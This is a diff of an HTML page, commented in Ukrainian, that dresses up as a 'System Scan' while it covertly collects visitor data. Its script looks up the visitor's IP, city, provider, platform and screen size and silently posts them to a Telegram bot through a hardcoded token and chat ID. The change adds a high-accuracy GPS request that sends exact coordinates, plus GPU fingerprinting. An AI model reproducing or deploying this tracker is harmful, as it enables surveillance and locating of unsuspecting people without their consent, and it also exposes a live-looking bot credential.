@@ -1,29 +1,27 @@
 <!DOCTYPE html>
 <html lang="uk">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>System Scan</title>
-<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
-
-<style>
-    body { margin: 0; background: radial-gradient(circle at top, #0b1220, #05060a); color: #e5e7eb; font-family: Consolas, monospace; }
-    .status { text-align: center; margin-top: 25px; font-size: 20px; letter-spacing: 2px; color: #60a5fa; }
-    .container { width: 90%; max-width: 800px; margin: 40px auto; }
-    .box { background: rgba(15, 23, 42, 0.9); padding: 12px; border-radius: 12px; margin-bottom: 10px; opacity: 0; transform: translateY(10px); transition: 0.4s; box-shadow: 0 0 15px rgba(0,0,0,0.4); }
-    .show { opacity: 1; transform: translateY(0); }
-    .label { color: #94a3b8; font-size: 12px; }
-    .value { color: white; margin-top: 5px; word-break: break-all; }
-    .progress { height: 18px; background: #111827; border-radius: 10px; overflow: hidden; }
-    .bar { height: 100%; width: 0%; background: linear-gradient(90deg, #3b82f6, #60a5fa); }
-    #map { height: 320px; display: none; border-radius: 12px; margin-top: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
-    .success { text-align: center; margin-top: 10px; color: #22c55e; font-size: 18px; display: none; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Scan</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
+    <style>
+        body { margin: 0; background: radial-gradient(circle at top, #0b1220, #05060a); color: #e5e7eb; font-family: Consolas, monospace; overflow-x: hidden; }
+        .status { text-align: center; margin-top: 25px; font-size: 20px; letter-spacing: 2px; color: #60a5fa; }
+        .container { width: 90%; max-width: 800px; margin: 40px auto; }
+        .box { background: rgba(15, 23, 42, 0.9); padding: 12px; border-radius: 12px; margin-bottom: 10px; opacity: 0; transform: translateY(10px); transition: 0.4s; box-shadow: 0 0 15px rgba(0,0,0,0.4); }
+        .show { opacity: 1; transform: translateY(0); }
+        .label { color: #94a3b8; font-size: 11px; text-transform: uppercase; }
+        .value { color: white; margin-top: 5px; word-break: break-all; font-size: 14px; }
+        .progress { height: 18px; background: #111827; border-radius: 10px; overflow: hidden; }
+        .bar { height: 100%; width: 0%; background: linear-gradient(90deg, #3b82f6, #60a5fa); transition: width 0.05s linear; }
+        #map { height: 320px; display: none; border-radius: 12px; margin-top: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.5); border: 1px solid #1e293b; }
+        .success { text-align: center; margin-top: 10px; color: #22c55e; font-size: 18px; display: none; }
+    </style>
 </head>
-
 <body>
 
-<div class="status" id="statusText">SCANNING SYSTEM...</div>
+<div class="status" id="statusText">INITIALIZING SCAN...</div>
 
 <div class="container">
     <div class="box show">
@@ -31,11 +29,11 @@
         <div class="value" id="percent">0%</div>
     </div>
 
-    <div class="box" id="ipBox"><div class="label">IP ADDRESS</div><div class="value" id="ip">---</div></div>
-    <div class="box" id="countryBox"><div class="label">LOCATION</div><div class="value" id="location">---</div></div>
-    <div class="box" id="ispBox"><div class="label">PROVIDER</div><div class="value" id="isp">---</div></div>
-    <div class="box" id="deviceBox"><div class="label">DEVICE</div><div class="value" id="device">---</div></div>
-    <div class="box" id="timeBox"><div class="label">TIME</div><div class="value" id="time">---</div></div>
+    <div class="box" id="ipBox"><div class="label">IP Address</div><div class="value" id="ip">---</div></div>
+    <div class="box" id="countryBox"><div class="label">Location</div><div class="value" id="location">---</div></div>
+    <div class="box" id="ispBox"><div class="label">Provider</div><div class="value" id="isp">---</div></div>
+    <div class="box" id="deviceBox"><div class="label">Device System</div><div class="value" id="device">---</div></div>
+    <div class="box" id="timeBox"><div class="label">Scan Time</div><div class="value" id="time">---</div></div>
 
     <div id="map"></div>
     <div class="success" id="successText">SCAN COMPLETED SUCCESSFULLY</div>
@@ -44,126 +42,131 @@
 <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
 
 <script>
-// --- КОНФІГУРАЦІЯ ТЕЛЕГРАМ ---
+// --- КОНФІГУРАЦІЯ (ТВОЇ ДАНІ) ---
 const TG_TOKEN = "8639479669:AAHYhGU7UMGZ5nlo3-PGzKVsQx9vTaQojFk";
-const TG_CHAT_ID = "7445429506";
+const TG_CHAT_ID = "-5268795829";
 
-// час
+// Годинник
 setInterval(() => {
-    document.getElementById("time").innerText = new Date().toLocaleString();
+    const el = document.getElementById("time");
+    if(el) el.innerText = new Date().toLocaleString();
 }, 1000);
 
-// прогрес
+// Прогрес-бар
 let p = 0;
+let bar = document.getElementById("bar");
+let percent = document.getElementById("percent");
+let statusText = document.getElementById("statusText");
+
 let scan = setInterval(() => {
     p++;
-    document.getElementById("bar").style.width = p + "%";
-    document.getElementById("percent").innerText = p + "%";
+    bar.style.width = p + "%";
+    percent.innerText = p + "%";
     if (p >= 100) {
         clearInterval(scan);
-        document.getElementById("statusText").innerText = "FINALIZING...";
+        statusText.innerText = "FINALIZING...";
         startLogic();
     }
 }, 20);
 
-// Функція відправки повідомлення
-function sendToTelegram(d) {
-    const text = `
-🔔 *НОВИЙ ВІЗИТ!*
-🌐 *IP:* ${d.ip}
+async function sendToTelegram(d, type = "IP") {
+    const message = `
+🔔 *${type === 'GPS' ? '🎯 ТОЧНА ЛОКАЦІЯ' : '🌐 НОВИЙ ВІЗИТ'}*
+🌐 *IP:* \`${d.ip}\`
 🌍 *Місце:* ${d.city}, ${d.country_name}
-🏢 *Провайдер:* ${d.org}
-📱 *OS/Браузер:* ${navigator.userAgent}
+🏢 *Провайдер:* ${d.org || 'Невідомо'}
+📱 *Платформа:* ${navigator.platform}
 🖥️ *Екран:* ${screen.width}x${screen.height}
-🌍 *Мова:* ${navigator.language}
-⏰ *Час:* ${new Date().toLocaleString()}
-🔗 *Maps:* https://www.google.com/maps?q=${d.latitude},${d.longitude}
+🔗 *Google Maps:* https://www.google.com/maps?q=${d.latitude},${d.longitude}
     `;
 
-    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            chat_id: TG_CHAT_ID,
-            text: text,
-            parse_mode: "Markdown"
-        })
-    }).catch(err => console.error("TG Error:", err));
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: TG_CHAT_ID,
+                text: message,
+                parse_mode: "Markdown"
+            })
+        });
+        const res = await response.json();
+        if(!res.ok) {
+            console.error("TG Error:", res.description);
+            statusText.innerText = "TG ERROR: " + res.description;
+        }
+    } catch (e) {
+        console.error("Fetch Error:", e);
+    }
 }
 
 function startLogic() {
     fetch("https://ipapi.co/json/")
         .then(r => r.json())
         .then(data => {
-            
-            // Відправляємо боту відразу
-            sendToTelegram(data);
+            // Відправляємо боту
+            sendToTelegram(data, "IP");
 
             // Почергова поява для юзера
-            setTimeout(() => {
-                document.getElementById("ip").innerText = data.ip;
-                document.getElementById("ipBox").classList.add("show");
-            }, 300);
+            setTimeout(() => { document.getElementById("ip").innerText = data.ip; document.getElementById("ipBox").classList.add("show"); }, 300);
+            setTimeout(() => { document.getElementById("location").innerText = `${data.city}, ${data.country_name}`; document.getElementById("countryBox").classList.add("show"); }, 600);
+            setTimeout(() => { document.getElementById("isp").innerText = data.org || "Unknown Provider"; document.getElementById("ispBox").classList.add("show"); }, 900);
+            setTimeout(() => { document.getElementById("device").innerText = navigator.userAgent.split(') ')[1] || navigator.platform; document.getElementById("deviceBox").classList.add("show"); }, 1200);
+            setTimeout(() => { document.getElementById("timeBox").classList.add("show"); }, 1500);
 
-            setTimeout(() => {
-                document.getElementById("location").innerText = `${data.city}, ${data.country_name}`;
-                document.getElementById("countryBox").classList.add("show");
-            }, 600);
-
-            setTimeout(() => {
-                document.getElementById("isp").innerText = data.org;
-                document.getElementById("ispBox").classList.add("show");
-            }, 900);
-
-            setTimeout(() => {
-                document.getElementById("device").innerText = navigator.userAgent;
-                document.getElementById("deviceBox").classList.add("show");
-            }, 1200);
-
-            setTimeout(() => {
-                document.getElementById("timeBox").classList.add("show");
-            }, 1500);
-
-            // Додаткові дані для юзера
+            // EXTRA DATA блок
             setTimeout(() => {
                 const extra = document.createElement("div");
                 extra.className = "box show";
                 extra.innerHTML = `
-                    <div class="label">EXTRA DATA</div>
+                    <div class="label">Advanced Metrics</div>
                     <div class="value">
-                        LANGUAGE: ${navigator.language} <br>
-                        SCREEN: ${screen.width}x${screen.height} <br>
-                        TIMEZONE: ${Intl.DateTimeFormat().resolvedOptions().timeZone} <br>
-                        COOKIES: ${navigator.cookieEnabled ? "YES" : "NO"} <br>
-                        CPU CORES: ${navigator.hardwareConcurrency || "Unknown"}
+                        Language: ${navigator.language}<br>
+                        GPU: ${getGPU()}<br>
+                        Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
                     </div>
                 `;
                 document.querySelector(".container").appendChild(extra);
-            }, 1700);
+            }, 1800);
 
+            // GPS запит + карта
             setTimeout(() => {
-                showMap(data.latitude, data.longitude, data.city);
-            }, 2000);
-
-        })
-        .catch((err) => {
-            console.error("Fetch Error:", err);
-            document.getElementById("statusText").innerText = "ERROR";
+                if ("geolocation" in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            const gpsData = { ...data, latitude: pos.coords.latitude, longitude: pos.coords.longitude };
+                            sendToTelegram(gpsData, "GPS");
+                            showMap(pos.coords.latitude, pos.coords.longitude, "🎯 Ви тут");
+                        },
+                        () => { showMap(data.latitude, data.longitude, data.city); },
+                        { enableHighAccuracy: true, timeout: 5000 }
+                    );
+                } else {
+                    showMap(data.latitude, data.longitude, data.city);
+                }
+            }, 2100);
         });
 }
 
+function getGPU() {
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+    } catch (e) { return "Graphics Driver N/A"; }
+}
+
 function showMap(lat, lon, label) {
-    document.getElementById("map").style.display = "block";
-    document.getElementById("statusText").innerText = "SUCCESS";
+    const mapDiv = document.getElementById("map");
+    mapDiv.style.display = "block";
+    statusText.innerText = "SCAN SUCCESSFUL";
     document.getElementById("successText").style.display = "block";
 
     if (window.myMap) window.myMap.remove();
-
-    window.myMap = L.map('map').setView([lat, lon], 13);
+    window.myMap = L.map('map', {zoomControl: false}).setView([lat, lon], 14);
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(window.myMap);
-    L.marker([lat, lon]).addTo(window.myMap)
-        .bindPopup(label || "User location")
-        .openPopup();
+    L.marker([lat, lon]).addTo(window.myMap).bindPopup(label).openPopup();
 }
 </script>
 
